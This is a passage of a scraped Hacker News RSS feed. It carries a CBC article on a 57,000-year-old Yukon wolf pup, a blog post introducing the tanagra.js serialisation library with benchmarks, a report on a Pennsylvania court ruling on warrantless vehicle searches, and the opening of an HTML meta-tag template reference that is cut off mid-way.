780w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/ice-age-wolf-pup.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf-pup.jpeg"></p></div><figcaption>'She's just so complete. She's so amazing. She's so intact,' said researcher Julie Meachen of Des Moines University in Iowa, seen here with ZhÃ¹r and veterinarian Jess Heath at a Whitehorse vet clinic in 2019. Heath is one of several co-authors of the new research paper.<!-- --> <!-- -->(Government of Yukon)</figcaption></figure></span></p>  <p>Through a variety of testing and analysis, the team of researchers was able to determine the pup â€”&nbsp;named ZhÃ¹r,&nbsp;which means "wolf" in the local Indigenous HÃ¤n language â€”&nbsp;was just seven weeks old when it died in its den.&nbsp;</p>  <p>Genetic testing also revealed the wolf is not related to wolves found in North America&nbsp;today.&nbsp;</p>  <p>"We learned she is very closely related to ice age wolves in Europe," said Yukon paleontologist Grant Zazula.</p>  <p>"And that's really interesting because that tells us that there was a major population change that happened in North America with grey wolves at the end of the ice age."</p>  <p>The scientists say they were most surprised to discover something about the diet of the little wolf. The animal's last meal&nbsp;wasn't bison or caribou or muskox as they had expected of the carnivore. It was&nbsp;fish.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/ice-age-wolf.jpeg 300w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/ice-age-wolf.jpeg 460w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/ice-age-wolf.jpeg 620w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf.jpeg 780w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/ice-age-wolf.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf.jpeg"></p></div><figcaption>An artist's rendering of ZhÃ¹r's world, 57,000 years ago. Researchers were surprised to discover that the wolf pup's diet seemed to include fish.<!-- --> <!-- -->(Julius Csotonyi)</figcaption></figure></span></p>  <p>"Based on the analysis of chemical components in her hair and other tissues, we were able to determine what her last meal was," said&nbsp;Zazula.&nbsp;</p>  <p>He says looking at things such as&nbsp;the ratio of carbon and nitrogen preserved in the tissue, it was clear the pup was eating aquatic species, most likely salmon.&nbsp;</p>  <h2>Culturally significant&nbsp;</h2>  <p>ZhÃ¹r is&nbsp;significant&nbsp;not only to&nbsp;the scientists&nbsp;but also to the Tr'ondÃ«k HwÃ«ch'in First Nation in Yukon.&nbsp;</p>  <p>"We are connected to this wolf pup," says&nbsp;Debbie Nagano, the director of heritage for the Tr'ondÃ«k HwÃ«ch'in&nbsp;and a member of the First Nation's wolf clan.&nbsp;</p>  <p>Soon after the initial discovery, ZhÃ¹r&nbsp;was brought back to Dawson City&nbsp;for a special blessing ceremony with First Nations elders&nbsp;and was given a&nbsp;name. Nagano says before the animal&nbsp;went off for analysis, the First Nation worked with the scientists to ensure ZhÃ¹r&nbsp;wouldn't be treated just as a specimen.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/grant-zazula.jpg 300w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/grant-zazula.jpg 460w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/grant-zazula.jpg 620w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/grant-zazula.jpg 780w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/grant-zazula.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/grant-zazula.jpg"></p></div><figcaption>Yukon paleontologist Grant Zazula with ZhÃ¹r.<!-- --> <!-- -->(Cheryl Kawaja/CBC)</figcaption></figure></span></p>  <p>"That side is quite important to us,"&nbsp;Nagano said. "There is a connection to it. We don't want it to be just handled in the view of, 'It's just an artifact.'</p>  <p>"We really want it to be able to have the respect behind it also. Not in the way it's respected physically; it also need to be respected spiritually."&nbsp;</p>  <p>Nagano says the discovery of ZhÃ¹r&nbsp;has also helped improve the relationships between the First Nation and scientists, and also with the government and the mining community.&nbsp;</p>  <p>"This wolf pup is bringing us together in a good way, that we can all learn from it," she said. "That part is a good way to be thankful for this wolf pup."&nbsp;</p>  <h2>Rare find</h2>  <p>For their part, the scientists are also grateful to the placer miner who first discovered ZhÃ¹r,&nbsp;in 2016.</p>  <p>Neil Loveless came across the animal thawing out of the permafrost.&nbsp;</p>  <p>"I just saw this thing that didn't quite look right," he recalled. "I picked it up and to be honest, I thought maybe it was like an old, like a puppy or something ...&nbsp;that had fallen down the mine&nbsp;shaft."&nbsp;</p>  <p>He put the remains&nbsp;in a gold pan and later in a freezer until a&nbsp;paleontologist arrived to have a look.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/neil-loveless.jpeg 300w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/neil-loveless.jpeg 460w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/neil-loveless.jpeg 620w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/neil-loveless.jpeg 780w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/neil-loveless.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/neil-loveless.jpeg"></p></div><figcaption>More precious than gold? Placer miner Neil Loveless put the wolf pup in a gold pan when he found it. At first, he thought it was a puppy that had fallen down a mine shaft.<!-- --> <!-- -->(Government of Yukon)</figcaption></figure></span></p>  <p>The scientists say&nbsp;it's that&nbsp;kind of collaboration with the mining community that makes their research possible.&nbsp;</p>  <p>Ice-age remains are commonly dug out of the permafrost in Yukon â€” bones of mammoths, bison and horses â€” but a complete specimen like&nbsp;ZhÃ¹r&nbsp;is very rare, at least for now.&nbsp;</p>  <p>Meachen&nbsp;hopes there may be more to find.&nbsp;</p>  <p>"As global warming continues to thaw the permafrost, one silver lining is that other exceptionally preserved frozen mummies will likely be discovered, providing new windows into the past," she said.&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/north/yukon-ice-age-wolf-pup-research-paper-1.5847730</link>
            <guid isPermaLink="false">hacker-news-small-sites-25512461</guid>
            <pubDate>Tue, 22 Dec 2020 23:01:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serialising complex objects in JavaScript â€“ an introduction to tanagra.js]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25512195">thread link</a>) | @lukedawilson
<br/>
December 22, 2020 | https://blog.tietokone.io/serialising-complex-objects-in-javascript/ | <a href="https://web.archive.org/web/*/https://blog.tietokone.io/serialising-complex-objects-in-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><em>Originally posted on the <a href="https://www.toptal.com/javascript/serializing-complex-objects-in-javascript">Toptal blog</a>.</em></p>

<p>Modern websites typically retrieve data from a number of different locations, including databases and third-party APIs. For example, when authenticating a user, a website might look up the user record from the database, then embellish it with data from some external services via API calls. Minimising expensive calls to these data sources, such as disk access for database queries and internet roundtrips for API calls, is essential to maintaining a fast, responsive site. Data caching is a common optimisation technique used to achieve this.</p>

<p>Processes store their working data in memory. If a web server runs in a single process (such as Node.js/Express), then this data can easily be cached using a memory cache running in the same process. However, load-balanced web servers span multiple processes, and even when working with a single process, you might want the cache to persist when the server is restarted. This necessitates an out-of-process caching solution such as Redis, which means the data needs to be serialised somehow, and deserialised when read from the cache.</p>

<p>Serialisation and deserialisation are relatively straightforward to achieve in statically typed languages such as C#. However, the dynamic nature of Javascript makes the problem a little trickier. While ECMAScript 6 (ES6) introduced classes, the fields on these classes (and their types) arenâ€™t defined until they are initialisedâ€”which may not be when the class is instantiatedâ€”and the return types of fields and functions arenâ€™t defined at all in the schema. Whatâ€™s more, the structure of the class can easily be changed at runtimeâ€”fields can be added or removed, types can be changed, etc. While this is possible using reflection in C#, reflection represents the â€œdark artsâ€ of that language, and developers expect it to break functionality.</p>

<p>I was presented with this problem at work a few years ago when working on the Toptal core team. We were building an agile dashboard for our teams, which needed to be fast, otherwise, developers and product owners wouldnâ€™t use it. We pulled data from a number of sources: our work-tracking system, our project management tool, and a database. The site was built in Node.js/Express, and we had a memory cache to minimise calls to these data sources. However, our rapid, iterative development process meant we deployed (and therefore restarted) several times a day, invalidating the cache and thereby losing many of its benefits.</p>

<p>An obvious solution was an out-of-process cache such as <a href="https://redislabs.com/">Redis</a>. However, after some research, I found that no good serialisation library existed for JavaScript. The built-in JSON.stringify/JSON.parse methods return data of the object type, losing any functions on the prototypes of the original classes. This meant the deserialised objects couldnâ€™t simply be used â€œin-placeâ€ within our application, which would therefore require considerable refactoring to work with an alternative design.</p>

<h2 id="requirements-for-the-library">Requirements for the Library</h2>

<p>In order to support serialisation and deserialisation of arbitrary data in Javascript, with the deserialised representations and originals usable interchangeably, we needed a serialisation library with the following properties:</p>

<ul>
  <li>The deserialised representations must have the same prototype (functions, getters, setters) as the original objects</li>
  <li>The library should support nested complexity types (including arrays and maps), with the prototypes of the nested objects set correctly</li>
  <li>It should be possible to serialise and deserialise the same objects multiple timesâ€”the process should be idempotent</li>
  <li>The serialisation format should be easily transmittable over TCP and storable using Redis or a similar service</li>
  <li>Minimal code changes should be required to mark a class as serialisable</li>
  <li>The library routines should be fast.</li>
  <li>Ideally, there should be some way to support deserialisation of old versions of a class, through some sort of mapping/versioning</li>
</ul>

<h2 id="implementation">Implementation</h2>

<p>To plug this gap, I decided to write  <em>Tanagra.js</em>, a general-purpose serialisation library for Javascript. The name of the library is a reference to one of my favorite episodes of  <em>Star Trek: The Next Generation</em>, where the crew of the  <em>Enterprise</em>  must learn to communicate with a mysterious alien race whose language is unintelligible. This serialisation library supports common data formats to avoid such problems.</p>

<p><em>Tanagra.js</em>  is designed to be simple and lightweight, and it currently supports Node.js (it hasnâ€™t been tested in-browser, but in theory, it should work) and ES6 classes (including Maps). The main implementation supports JSON, and an experimental version supports Google Protocol Buffers. The library requires only standard Javascript (currently tested with ES6 and Node.js), with no dependency on experimental features,  <em>Babel</em>  transpiling, or  <em>TypeScript</em>.</p>

<p>Serialisable classes are marked as such with a method call when the class is exported:</p>

<div><div><pre><code><span>module</span><span>.</span><span>exports</span> <span>=</span> <span>serializable</span><span>(</span><span>Foo</span><span>,</span> <span>myUniqueSerialisationKey</span><span>)</span>
</code></pre></div></div>

<p>The method returns a  <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">proxy</a>  to the class, which intercepts the constructor and injects a unique identifier. (If not specified, this defaults to the class name.) This key is serialised with the rest of the data, and the class also exposes it as a static field. If the class contains any nested types (i.e., members with types that need serialising), they are also specified in the method-call:</p>

<div><div><pre><code><span>module</span><span>.</span><span>exports</span> <span>=</span> <span>serializable</span><span>(</span><span>Foo</span><span>,</span> <span>[</span><span>Bar</span><span>,</span> <span>Baz</span><span>],</span> <span>myUniqueSerialisationKey</span><span>)</span>
</code></pre></div></div>

<p>(Nested types for previous versions of the class can also be specified in a similar way, so that, for example, if you serialise a Foo1, it can be deserialised into a Foo2.)</p>

<p>During serialisation, the library recursively builds up a global map of keys to classes, and uses this during deserialisation. (Remember, the key is serialised with the rest of the data.) In order to know the type of the â€œtop-levelâ€ class, the library requires that this be specified in the deserialisation call:</p>

<div><div><pre><code><span>const</span> <span>foo</span> <span>=</span> <span>decodeEntity</span><span>(</span><span>serializedFoo</span><span>,</span> <span>Foo</span><span>)</span>
</code></pre></div></div>

<p>An experimental auto-mapping library walks the module tree and generates the mappings from the class names, but this only works for uniquely named classes.</p>

<h2 id="project-layout">Project Layout</h2>

<p>The project is divided into a number of modules:</p>

<ul>
  <li><a href="https://www.npmjs.com/package/tanagra-core">tanagra-core</a>  - common functionality required by the different serialisation formats, including the function for marking classes as  <em>serializable</em></li>
  <li><a href="https://www.npmjs.com/package/tanagra-json">tanagra-json</a>  - serialises the data into JSON format</li>
  <li><a href="https://www.npmjs.com/package/tanagra-protobuf">tanagra-protobuf</a>  - serialises the data into Google protobuffers format (experimental)</li>
  <li><a href="https://www.npmjs.com/package/tanagra-protobuf-redis-cache">tanagra-protobuf-redis-cache</a>  - a helper library for storing serialised protobufs in  <em>Redis</em></li>
  <li><a href="https://www.npmjs.com/package/tanagra-auto-mapper">tanagra-auto-mapper</a>  - walks the module tree in  <em>Node.js</em>  to build up a map of classes, meaning the user doesnâ€™t have to specify the type to deserialise to (experimental).</li>
</ul>

<p>Note that the library uses US spelling.</p>

<h2 id="example-usage">Example Usage</h2>

<p>The following example declares a serialisable class and uses the tanagra-json module to serialise/deserialise it:</p>

<div><div><pre><code><span>const</span> <span>serializable</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>tanagra-core</span><span>'</span><span>).</span><span>serializable</span>
<span>class</span> <span>Foo</span> <span>{</span>
  <span>constructor</span><span>(</span><span>bar</span><span>,</span> <span>baz1</span><span>,</span> <span>baz2</span><span>,</span> <span>fooBar1</span><span>,</span> <span>fooBar2</span><span>)</span> <span>{</span>
	<span>this</span><span>.</span><span>someNumber</span> <span>=</span> <span>123</span>
	<span>this</span><span>.</span><span>someString</span> <span>=</span> <span>'</span><span>hello, world!</span><span>'</span>
	<span>this</span><span>.</span><span>bar</span> <span>=</span> <span>bar</span> <span>// a complex object with a prototype</span>
	<span>this</span><span>.</span><span>bazArray</span> <span>=</span> <span>[</span><span>baz1</span><span>,</span> <span>baz2</span><span>]</span>
	<span>this</span><span>.</span><span>fooBarMap</span> <span>=</span> <span>new</span> <span>Map</span><span>([</span>
  	<span>[</span><span>'</span><span>a</span><span>'</span><span>,</span> <span>fooBar1</span><span>],</span>
  	<span>[</span><span>'</span><span>b</span><span>'</span><span>,</span> <span>fooBar2</span><span>]</span>
	<span>])</span>
  <span>}</span>
<span>}</span>

<span>// Mark class `Foo` as serializable and containing sub-types `Bar`, `Baz` and `FooBar`</span>
<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>serializable</span><span>(</span><span>Foo</span><span>,</span> <span>[</span><span>Bar</span><span>,</span> <span>Baz</span><span>,</span> <span>FooBar</span><span>])</span>

<span>...</span>

<span>const</span> <span>json</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>tanagra-json</span><span>'</span><span>)</span>
<span>json</span><span>.</span><span>init</span><span>()</span>
<span>// or:</span>
<span>// require('tanagra-protobuf')</span>
<span>// await json.init()</span>

<span>const</span> <span>foo</span> <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>bar</span><span>,</span> <span>baz</span><span>)</span>
<span>const</span> <span>encoded</span> <span>=</span> <span>json</span><span>.</span><span>encodeEntity</span><span>(</span><span>foo</span><span>)</span>

<span>...</span>

<span>const</span> <span>decoded</span> <span>=</span> <span>json</span><span>.</span><span>decodeEntity</span><span>(</span><span>encoded</span><span>,</span> <span>Foo</span><span>)</span>
</code></pre></div></div>

<h2 id="performance">Performance</h2>

<p>I compared the performance of the two serialisers (the  <em>JSON</em>  serialiser and experimental  <em>protobufs</em>  serialiser) with a control (native JSON.parse and JSON.stringify). I conducted a total of 10 trials with each.</p>

<p>I tested this on my 2017  <em>Dell XPS15</em>  laptop with 32Gb memory, running Ubuntu 17.10.</p>

<p>I serialised the following nested object:</p>

<div><div><pre><code><span>foo</span><span>:</span> <span>{</span>
  <span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Hello foo</span><span>"</span><span>,</span>
  <span>"</span><span>number</span><span>"</span><span>:</span> <span>123123</span><span>,</span>
  <span>"</span><span>bars</span><span>"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Complex Bar 1</span><span>"</span><span>,</span>
      <span>"</span><span>date</span><span>"</span><span>:</span> <span>"</span><span>2019-01-09T18:22:25.663Z</span><span>"</span><span>,</span>
      <span>"</span><span>baz</span><span>"</span><span>:</span> <span>{</span>
    	<span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Simple Baz</span><span>"</span><span>,</span>
    	<span>"</span><span>number</span><span>"</span><span>:</span> <span>456456</span><span>,</span>
    	<span>"</span><span>map</span><span>"</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
      <span>}</span>
    <span>},</span>
    <span>{</span>
      <span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Complex Bar 2</span><span>"</span><span>,</span>
      <span>"</span><span>date</span><span>"</span><span>:</span> <span>"</span><span>2019-01-09T18:22:25.663Z</span><span>"</span><span>,</span>
      <span>"</span><span>baz</span><span>"</span><span>:</span> <span>{</span>
    	<span>"</span><span>string</span><span>"</span><span>:</span> <span>"</span><span>Simple Baz</span><span>"</span><span>,</span>
    	<span>"</span><span>number</span><span>"</span><span>:</span> <span>456456</span><span>,</span>
    	<span>"</span><span>map</span><span>"</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>],</span>
  <span>"</span><span>bazs</span><span>"</span><span>:</span> <span>Map</span> <span>{</span>
    <span>'</span><span>baz1</span><span>'</span> <span>=&gt;</span> <span>Baz</span> <span>{</span>
      <span>string</span><span>:</span> <span>'</span><span>baz1</span><span>'</span><span>,</span>
      <span>number</span><span>:</span> <span>111</span><span>,</span>
      <span>map</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
    <span>},</span>
    <span>'</span><span>baz2</span><span>'</span> <span>=&gt;</span> <span>Baz</span> <span>{</span>
      <span>string</span><span>:</span> <span>'</span><span>baz2</span><span>'</span><span>,</span>
      <span>number</span><span>:</span> <span>222</span><span>,</span>
      <span>map</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
    <span>},</span>
    <span>'</span><span>baz3</span><span>'</span> <span>=&gt;</span> <span>Baz</span> <span>{</span>
      <span>string</span><span>:</span> <span>'</span><span>baz3</span><span>'</span><span>,</span>
      <span>number</span><span>:</span> <span>333</span><span>,</span>
      <span>map</span><span>:</span> <span>Map</span> <span>{</span> <span>'</span><span>a</span><span>'</span> <span>=&gt;</span> <span>1</span><span>,</span> <span>'</span><span>b</span><span>'</span> <span>=&gt;</span> <span>2</span><span>,</span> <span>'</span><span>c</span><span>'</span> <span>=&gt;</span> <span>2</span> <span>}</span>
    <span>}</span>
  <span>},</span>
<span>}</span>
</code></pre></div></div>

<h3 id="write-performance">Write performance</h3>

<table>
  <thead>
    <tr>
      <th>Serialisation method</th>
      <th>Ave. inc. first trial (ms)</th>
      <th>StDev. inc. first trial (ms)</th>
      <th>Ave. ex. first trial (ms)</th>
      <th>StDev. ex. first trial (ms)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>JSON</td>
      <td>0.115</td>
      <td>0.0903</td>
      <td>0.0879</td>
      <td>0.0256</td>
    </tr>
    <tr>
      <td>Google Protobufs</td>
      <td>2.00</td>
      <td>2.748</td>
      <td>1.13</td>
      <td>0.278</td>
    </tr>
    <tr>
      <td>Control group</td>
      <td>0.0155</td>
      <td>0.00726</td>
      <td>0.0139</td>
      <td>0.00570</td>
    </tr>
  </tbody>
</table>

<h3 id="read-performance">Read performance</h3>

<table>
  <thead>
    <tr>
      <th>Serialisation method</th>
      <th>Ave. inc. first trial (ms)</th>
      <th>StDev. inc. first trial (ms)</th>
      <th>Ave. ex. first trial (ms)</th>
      <th>StDev. ex. first trial (ms)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>JSON</td>
      <td>0.133</td>
      <td>0.102</td>
      <td>0.104</td>
      <td>0.0429</td>
    </tr>
    <tr>
      <td>Google Protobufs</td>
      <td>2.62</td>
      <td>1.12</td>
      <td>2.28</td>
      <td>0.364</td>
    </tr>
    <tr>
      <td>Control group</td>
      <td>0.0135</td>
      <td>0.00729</td>
      <td>0.0115</td>
      <td>0.00390</td>
    </tr>
  </tbody>
</table>

<h2 id="summary">Summary</h2>

<p>The  <em>JSON</em>  serialiser is around 6-7 times slower than native serialisation. The experimental  <em>protobufs</em>  serialiser is around 13 times slower than the  <em>JSON</em>  serialiser, or 100 times slower than native serialisation.</p>

<p>Additionally, the internal caching of schema/structural information within each serialiser clearly has an effect on performance. For the JSON serialiser, the first write is about four times slower than the average. For the protobuf serialiser, itâ€™s nine times slower. So writing objects whose metadata has already been cached is much quicker in either library.</p>

<p>The same effect was observed â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.tietokone.io/serialising-complex-objects-in-javascript/">https://blog.tietokone.io/serialising-complex-objects-in-javascript/</a></em></p>]]>
            </description>
            <link>https://blog.tietokone.io/serialising-complex-objects-in-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25512195</guid>
            <pubDate>Tue, 22 Dec 2020 22:35:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pennsylvania Court Alters Police Rules for Warrantless Vehicle Searches]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511930">thread link</a>) | @tantalor
<br/>
December 22, 2020 | https://www.wesa.fm/post/court-alters-police-rules-warrantless-vehicle-searches | <a href="https://web.archive.org/web/*/https://www.wesa.fm/post/court-alters-police-rules-warrantless-vehicle-searches">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div property="content:encoded"><p>Police must have probable cause as well as â€œexigent circumstancesâ€ in order to legally search a vehicle without a warrant, a divided Pennsylvania Supreme Court ruled Tuesday.</p> <p>The 4-3 decision said the state constitution's privacy protections are greater than the U.S. Constitution's and that those protections extend to vehicles. The court overruled its own 2014 decision that probable cause alone was sufficient, given that vehicles are inherently mobile.</p> <p>â€œDifficulties in clarifying the scope of the exigency requirement will lead to debates about what exactly the Pennsylvania Constitution demands in a given situation. But so what?â€&nbsp;<a href="http://www.pacourts.us/assets/opinions/Supreme/out/J-51-2020mo%20-%20104639940122582972.pdf?cb=1">wrote&nbsp;</a>Justice Christine Donohue, referring to the state's constitutional language on searches.</p> <p>â€œThe long history of&nbsp;<a href="https://www.legis.state.pa.us/cfdocs/legis/LI/consCheck.cfm?txtType=HTM&amp;ttl=00&amp;div=0&amp;chpt=1&amp;sctn=8&amp;subsctn=0">Article I, Section 8</a>&nbsp;and its heightened privacy protections do not permit us to carry forward a bright-line rule that gives short shrift to citizensâ€™ privacy rights," Donohue wrote for the majority.</p> <p>Exigent circumstances might include a belief that people are in danger or that important evidence is about to disappear. Donohue said â€œthe universe of qualifying â€˜exigent circumstancesâ€™ is impossible to define with precision,â€ but they must go beyond that vehicles have wheels and can be driven away.</p> <p>In a&nbsp;<a href="https://supreme.justia.com/cases/federal/us/563/452/#tab-opinion-1963504">2011 search warrant case</a>&nbsp;that did not involve a vehicle, the U.S. Supreme Court listed as exigent circumstances the need to provide emergency aid, hot pursuit of a fleeing suspect or the prospect of the destruction of evidence.</p> <p>Donohue's opinion was joined by three of the other four Democrats on the court. Both Republican justices and Democratic Justice Kevin Dougherty dissented, arguing the 2014 precedent should stand.</p> <p>â€œWhen we become untethered from our previous decisions, we instantly implicate this courtâ€™s credibility and our ability to effectively adjudicate the many types of cases upon which litigants look to us for guidance,â€&nbsp;<a href="http://www.pacourts.us/assets/opinions/Supreme/out/J-51-2020do2%20-%20104639940122585532.pdf?cb=1">wrote&nbsp;</a>Republican Justice Sallie Mundy.</p> <p>She said the previous standard of probable cause alone to justify a warrantless vehicle search â€œoffered a bright-line rule already in effect" and â€œdeferred to the needs of those we entrust with the difficult job of policing.â€</p> <p>The court sent the Philadelphia case that prompted the decision back to county court to more fully examine whether exigent circumstances existed.</p> <p>In that case, the defendant had been convicted of possession of heroin with intent to deliver after a 2016 vehicle stop in which drugs were recovered from a locked metal box inside the vehicle he had been driving.</p> </div></div></div></div>]]>
            </description>
            <link>https://www.wesa.fm/post/court-alters-police-rules-warrantless-vehicle-searches</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511930</guid>
            <pubDate>Tue, 22 Dec 2020 22:12:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quick Reference for all modern/useful HTML5 link and meta tags]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25511860">thread link</a>) | @smpnjn
<br/>
December 22, 2020 | https://fjolt.com/article/meta-tag-ref-html-quick-start | <a href="https://web.archive.org/web/*/https://fjolt.com/article/meta-tag-ref-html-quick-start">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="container">
        



<!--#sidebar-->
        <article id="content">
            
            <div id="content-text">
                <p><strong>For every HTML page you should have a few key elements to ensure fast loading, and good SEO</strong>. The template below gives you all of those features, which you can quickly customise for your needs. I've also listed all useful meta tags below if you want to pull them out individually.</p>

<pre>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;My Website&lt;/title&gt;
        &lt;link rel="icon" type="text/png" href="https://fjolt.com/favicon.png"&gt;
        &lt;!-- load if you are using google fonts --&gt;
        &lt;!--&lt;link rel="preconnect" href="https://fonts.gstatic.com"&gt;--&gt;
        &lt;meta name=Ã¢â‚¬ï¿½descriptionÃ¢â‚¬ï¿½ content="Description of my website"&gt;
        &lt;meta name="robots" content="index,follow"&gt;
        &lt;meta name="keywords" content="tags,for,your,site"&gt;
        &lt;link rel="canonical" href="URL for this page"&gt;

        &lt;meta property="og:title" content="My Website" /&gt;
        &lt;meta property="og:description" content="Description of my website" /&gt;
        &lt;meta property="og:image" content="Image URL representing my website" /&gt;
        &lt;meta property="og:url" content="URL for this page" /&gt;
        &lt;meta property="og:site_name" content="My Website" /&gt;
        
        &lt;meta name="twitter:card" content="summary_large_image"&gt;
        &lt;meta name="twitter:site" content="https://fjolt.com"&gt;
        &lt;meta name="twitter:title" content="{{title}}"&gt;
        &lt;meta name="twitter:description" content="{{description}}"&gt;
        &lt;meta name="twitter:image" content="{{image}}"&gt;

        &lt;!-- For mobile devices --&gt;
        &lt;meta name="viewport" content="initial-scale=1, maximum-scale=1"&gt;
        
        &lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;
        &lt;!-- Use if you are using google analytics, replace [[ID HERE]] in script and code with your ID --&gt;
        &lt;!-- 
        &lt;script async src="https://www.googletagmanager.com/gtag/js?id=G-[[ID HERE]]"&gt;&lt;/script&gt;
        &lt;script&gt;
        var host = window.location.hostname;
            if(host !== "localhost") {
                window.dataLayer = window.dataLayer || [];
                function gtag(){dataLayer.push(arguments);}
                gtag('js', new Date());
    
                gtag('config', '[[ID HERE]]');
            }
        &lt;/script&gt;--&gt;
        &lt;!-- Preload your stylesheets --&gt;
        &lt;link rel="preload" href="/style.css" as="style" /&gt;
        &lt;!-- if you want to load some CSS async uncomment this --&gt;
        &lt;!--&lt;link rel="preload" href="/async.css" as="style" /&gt;--&gt;
    
        &lt;!-- Preload your fonts if necessary --&gt;
        &lt;link rel="preload" href="/fonts/fontName.ttf" as="font" crossorigin="anonymous" /&gt;
        &lt;link rel="preload" href="/fonts/fontName.ttf" as="font" crossorigin="anonymous" /&gt;
        
        &lt;!-- Load your stylesheets --&gt;
        &lt;link rel="stylesheet" href="/style.css" /&gt;
        &lt;!-- if you want to load some CSS async uncomment this --&gt;
